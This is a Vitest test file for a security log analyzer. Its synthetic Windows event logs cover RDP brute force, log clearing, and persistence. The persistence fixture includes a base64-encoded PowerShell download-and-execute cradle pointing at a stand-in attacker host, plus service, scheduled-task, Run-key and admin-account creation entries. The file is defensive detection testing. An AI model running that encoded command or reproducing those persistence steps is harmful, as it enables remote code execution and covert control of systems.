import { describe, expect, it } from "vitest";
import { analyzeLogArtifact } from "@/lib/logArtifact";

const TS = "2026-08-07T13:00:00.000Z";

const RDP_BRUTE_FORCE = `2024-06-03 08:12:01 - LOG: 4625: Security audit failure on RDP from 185.220.101.161
2024-06-03 08:12:02 - LOG: 4625: Security audit failure on RDP from 185.220.101.161
2024-06-03 08:12:03 - LOG: 4625: Security audit failure on RDP from 45.33.32.156
2024-06-03 08:12:04 - LOG: 4625: Security audit failure on RDP from 185.220.101.161
2024-06-03 08:12:05 - LOG: 4625: Security audit failure on RDP from 45.33.32.156
System Time: 2024-06-03 08:12:05
Event ID: 4625
AccountName: Administrator
Account Domain: CORP
Source Network Address: 185.220.101.161
Status: 0xC000006D

2024-06-03 08:12:06 - LOG: Security audit success on RDP
System Time: 2024-06-03 08:12:06
Event ID: 4624
AccountName: Administrator
Source Network Address: 45.33.32.156
`;

const NORMAL_BASELINE = `2024-06-07 10:30:00 - LOG: Service Control Manager started
Event ID: 6005

2024-06-07 10:30:01 - LOG: Time service initialized
Event ID: 12

2024-06-07 10:31:22 - LOG: Successful logon
Event ID: 4624
Target: jdoe

2024-06-07 10:32:44 - LOG: Successful logoff
Event ID: 4634
`;

const LOG_CLEARED = `2024-06-07 11:00:00 - LOG: Security log cleared via policy
Event ID: 1102

2024-06-07 11:00:01 - LOG: System time changed
Event ID: 4616

2024-06-07 11:01:00 - LOG: User logon
Event ID: 4624
`;

const PERSISTENCE = `2024-06-07 12:00:00 - LOG: New process
Event ID: 4688
ProcessName: powershell.exe
CommandLine: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC0AaABvAHMAdAAuAHIAdQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAiACkA

2024-06-07 12:00:01 - LOG: PowerShell script block
Event ID: 4104
ScriptBlock: Invoke-Expression -EncodedCommand SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC0AaABvAHMAdAAuAHIAdQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAiACkA

2024-06-07 12:01:00 - LOG: Service installed
Event ID: 4697
ServiceName: RansomService
Image: C:\\Users\\Public\\WinUpdateService.exe

2024-06-07 12:01:05 - LOG: Scheduled task created
Event ID: 4698
TaskName: MalwareUpdate

2024-06-07 12:01:12 - LOG: Event ID: 4657 - Key: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

2024-06-07 12:01:20 - LOG: User account created
Event ID: 4720
AccountName: svc_backup

2024-06-07 12:01:30 - LOG: Member added to local group
Event ID: 4732
AccountName: svc_backup
TargetUserName: Administrators
`;

describe("analyzeLogArtifact — RDP brute force", () => {
  it("detects failed logins and brute force with counts and T1110", () => {
    const r = analyzeLogArtifact({ logData: RDP_BRUTE_FORCE, committed: true }, { source: "test", ts: TS });
    expect(r).not.toBeNull();
    expect(r!.summary.verdict).toBe("malicious");
    expect(r!.summary.score).toBe(37);
    const titles = r!.findings.map((f) => f.title);
    expect(titles).toContain("Failed login attempt");
    expect(titles).toContain("Brute force attack detected");
    expect(r!.mitre.some((m) => m.technique === "T1110")).toBe(true);
  });

  it("keeps displayFindings sorted by severity with counts and engine technique", () => {
    const r = analyzeLogArtifact({ logData: RDP_BRUTE_FORCE, committed: true }, { source: "test", ts: TS })!;
    expect(r.displayFindings[0].severity).toBe("critical");
    const failed = r.displayFindings.find((d) => d.title === "Failed login attempt");
    expect(failed!.reason).toContain("6 occurrences");
    expect(failed!.technique).toBe("T1110");
  });

  it("extracts users, IPs and matched line counts", () => {
    const r = analyzeLogArtifact({ logData: RDP_BRUTE_FORCE, committed: true }, { source: "test", ts: TS })!;
    expect(r.logSummary.uniqueUsers).toContain("Administrator");
    expect(r.logSummary.uniqueIPs).toEqual(expect.arrayContaining(["185.220.101.161", "45.33.32.156"]));
    expect(r.logSummary.matchedLines).toBe(6);
    const iocs = r.iocs.map((i) => i.value);
    expect(iocs).toContain("185.220.101.161");
    expect(iocs).toContain("45.33.32.156");
  });
});

describe("analyzeLogArtifact — normal baseline", () => {
  it("produces no findings and a clean verdict", () => {
    const r = analyzeLogArtifact({ logData: NORMAL_BASELINE, committed: true }, { source: "test", ts: TS });
    expect(r!.findings.length).toBe(0);
    expect(r!.summary.verdict).toBe("clean");
    expect(r!.summary.score).toBe(0);
    expect(r!.logSummary.matchedLines).toBe(0);
    expect(r!.logSummary.uniqueIPs).toEqual([]);
  });
});

describe("analyzeLogArtifact — log clearing", () => {
  it("flags event log clearing and time change as anti-forensics", () => {
    const r = analyzeLogArtifact({ logData: LOG_CLEARED, committed: true }, { source: "test", ts: TS })!;
    const titles = r.findings.map((f) => f.title);
    expect(titles).toContain("Security log cleared");
    expect(titles).toContain("System time changed");
    expect(r.summary.verdict).toBe("suspicious");
    expect(r.summary.score).toBe(17);
    expect(r.mitre.some((m) => m.technique === "T1070.001")).toBe(true);
  });
});

describe("analyzeLogArtifact — persistence / encoded PowerShell", () => {
  it("fires encoded command, LOLBIN, service, task and registry run rules", () => {
    const r = analyzeLogArtifact({ logData: PERSISTENCE, committed: true }, { source: "test", ts: TS })!;
    const titles = r.findings.map((f) => f.title);
    expect(titles).toContain("Encoded command detected");
    expect(titles).toContain("LOLBIN execution detected");
    expect(titles).toContain("PowerShell script block logging");
    expect(titles).toContain("Service installed");
    expect(titles).toContain("Scheduled task created");
    expect(titles).toContain("Registry RUN key modification");
    expect(titles).toContain("User account created");
    expect(titles).toContain("Member added to security-enabled local group");
    expect(r.mitre.some((m) => m.technique === "T1059.001")).toBe(true);
    expect(r.mitre.some((m) => m.technique === "T1543.003")).toBe(true);
    expect(r.mitre.some((m) => m.technique === "T1547.001")).toBe(true);
    expect(r.summary.verdict).toBe("suspicious");
    expect(r.summary.score).toBe(92);
  });
});

describe("analyzeLogArtifact — gate + determinism", () => {
  it("returns null when not committed or data empty", () => {
    expect(analyzeLogArtifact({ logData: "", committed: true }, { ts: TS })).toBeNull();
    expect(analyzeLogArtifact({ logData: "   ", committed: true }, { ts: TS })).toBeNull();
    expect(analyzeLogArtifact({ logData: RDP_BRUTE_FORCE, committed: false }, { ts: TS })).toBeNull();
  });

  it("produces identical ids and summary for identical input", () => {
    const a = analyzeLogArtifact({ logData: RDP_BRUTE_FORCE, committed: true }, { source: "test", ts: TS })!;
    const b = analyzeLogArtifact({ logData: RDP_BRUTE_FORCE, committed: true }, { source: "test", ts: TS })!;
    expect(a.id).toBe(b.id);
    expect(a.artifact.id).toBe(b.artifact.id);
    expect(a.findings.map((f) => f.id)).toEqual(b.findings.map((f) => f.id));
    expect(a.observations.map((o) => o.id)).toEqual(b.observations.map((o) => o.id));
    expect(a.summary).toEqual(b.summary);
    expect(a.quality).toEqual(b.quality);
  });

  it("produces distinct ids for distinct inputs", () => {
    const a = analyzeLogArtifact({ logData: RDP_BRUTE_FORCE, committed: true }, { ts: TS })!;
    const b = analyzeLogArtifact({ logData: LOG_CLEARED, committed: true }, { ts: TS })!;
    expect(a.id).not.toBe(b.id);
  });
});

describe("analyzeLogArtifact — correlation with injected history", () => {
  it("flags a source IP as a previous case match", () => {
    const r = analyzeLogArtifact(
      { logData: RDP_BRUTE_FORCE, committed: true },
      {
        source: "test",
        ts: TS,
        history: { cases: [{ id: "case-x", title: "prior case", values: ["185.220.101.161"] }] },
      },
    )!;
    const prior = r.correlation.find((m) => m.dimension === "same-value-previous");
    expect(prior).toBeDefined();
    expect(prior?.matches[0]?.ref).toBe("case-x");
  });
});